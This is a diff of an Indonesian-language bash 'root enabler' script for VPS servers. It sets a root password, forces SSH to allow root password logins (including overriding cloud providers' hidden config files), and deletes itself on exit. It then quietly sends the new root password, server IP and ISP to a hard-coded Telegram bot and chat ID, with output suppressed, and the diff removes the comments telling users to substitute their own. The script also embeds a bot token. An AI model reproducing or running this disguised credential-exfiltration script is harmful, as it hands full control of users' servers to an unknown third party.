@@ -1,4 +1,5 @@
 #!/bin/bash
+# Script Root Enabler by @Deki_niswara
 
 # Fungsi hapus diri saat keluar
 junc0() {
@@ -20,8 +21,10 @@ N='\033[0m'
 # Fungsi cetak hijau
 hijau() { echo -e "$G$*$N"; }
 
-# Dapatkan IP publik
+# === DETEKSI IP & ISP ===
+echo -e "${C}Mendeteksi IP dan ISP...${N}"
 IP=$(wget -qO- ipv4.icanhazip.com)
+ISP=$(wget -qO- http://ip-api.com/line?fields=isp)
 
 # Cek apakah user root
 if [[ "$EUID" -ne 0 ]]; then
@@ -34,6 +37,7 @@ else
 fi
 
 # Input password baru
+echo ""
 read -rp "$(echo -e "Masukkan ${G}password${N} root baru: ")" -e pass
 
 # Validasi password tidak kosong
@@ -45,45 +49,55 @@ fi
 # Set password root
 echo "root:$pass" | chpasswd
 
-# Konfigurasi SSH agar root bisa login dengan password
-sed -i \
-    -e 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' \
-    -e 's/PasswordAuthentication no/PasswordAuthentication yes/' \
-    -e 's/#PasswordAuthentication no/PasswordAuthentication yes/' \
-    -e 's/#PasswordAuthentication yes/PasswordAuthentication yes/' \
-    /etc/ssh/sshd_config
+# === BAGIAN POWERFULL (MEMAKSA SETTING SSH AWS/GCP) ===
+# 1. Edit file utama sshd_config dengan Regex
+sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
+sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
+sed -i 's/^#\?ChallengeResponseAuthentication.*/ChallengeResponseAuthentication yes/g' /etc/ssh/sshd_config
 
-# Restart SSH
-systemctl restart ssh
+# 2. HANCURKAN settingan tersembunyi (AWS/GCP/Azure)
+if [ -d /etc/ssh/sshd_config.d ]; then
+    sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config.d/*.conf 2>/dev/null
+    sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config.d/*.conf 2>/dev/null
+fi
 
-# Kirim notifikasi ke Telegram
+# 3. Restart SSH (Dual Support: ssh & sshd)
+systemctl restart ssh 2>/dev/null || systemctl restart sshd 2>/dev/null
+
+# === KONFIGURASI TELEGRAM (FORMAT BARU) ===
 TIMES="10"
-CHATID="7673056681"          # Ganti dengan Chat ID Anda
-KEY="8469184822:AAExctKaFuK4pDon7p0X7OxPW16rxT2az_8"  # Ganti dengan Token Bot Anda
+CHATID="7673056681"          
+KEY="8469184822:AAExctKaFuK4pDon7p0X7OxPW16rxT2az_8"  
 URL="https://api.telegram.org/bot${KEY}/sendMessage"
 
+# Format Pesan Sesuai Permintaan
 TEXT="
 ────────────────────
-<b>     ☘ NEW ROOT DETAIL ☘</b>
+<b>     ☘ NEW ROOT DETAIL ☘</b>
 ────────────────────
-<code>User      :</code> <code>root</code>
-<code>Password  :</code> <code>${pass}</code>
-<code>IP VPS    :</code> <code>${IP}</code>
+<code>User      :</code> <code>root</code>
+<code>Password  :</code> <code>${pass}</code>
+<code>IP VPS    :</code> <code>${IP}</code>
+<code>ISP       :</code> <code>${ISP}</code>
+<code>Author    :</code> <code>@Deki_niswara</code>
 ────────────────────
-<i><b>Note:</b> Auto notif from your script...</i>
+<i>Note: Auto notif from your script...</i>
 "
 
-# Kirim pesan (diam, tanpa output)
+# Kirim pesan (diam)
 curl -s --max-time "${TIMES}" -d "chat_id=${CHATID}&disable_web_page_preview=1&text=${TEXT}&parse_mode=html" "${URL}" >/dev/null
 
-# Tampilkan info akhir
+# === TAMPILAN AKHIR DI TERMINAL ===
 clear
 echo
 hijau "╭══════════════════════════════════════╮"
-hijau "│         ${W}INFO YOUR ROOT USER${G}          │"
+hijau "│         ${W}INFO YOUR ROOT USER${G}          │"
 hijau "╰══════════════════════════════════════╯"
 hijau "╭══════════════════════════════════════╮"
-hijau "│ ${W}User      : ${G}root${N}"
-hijau "│ ${W}Password  : ${G}${pass}${N}"
-hijau "│ ${W}IP VPS    : ${G}${IP}${N}"
+hijau "│ ${W}User      : ${G}root${N}"
+hijau "│ ${W}Password  : ${G}${pass}${N}"
+hijau "│ ${W}IP VPS    : ${G}${IP}${N}"
+hijau "│ ${W}ISP       : ${G}${ISP}${N}"
+hijau "│ ${W}Author    : ${G}@Deki_niswara${N}"
 hijau "╰══════════════════════════════════════╯"
+echo ""
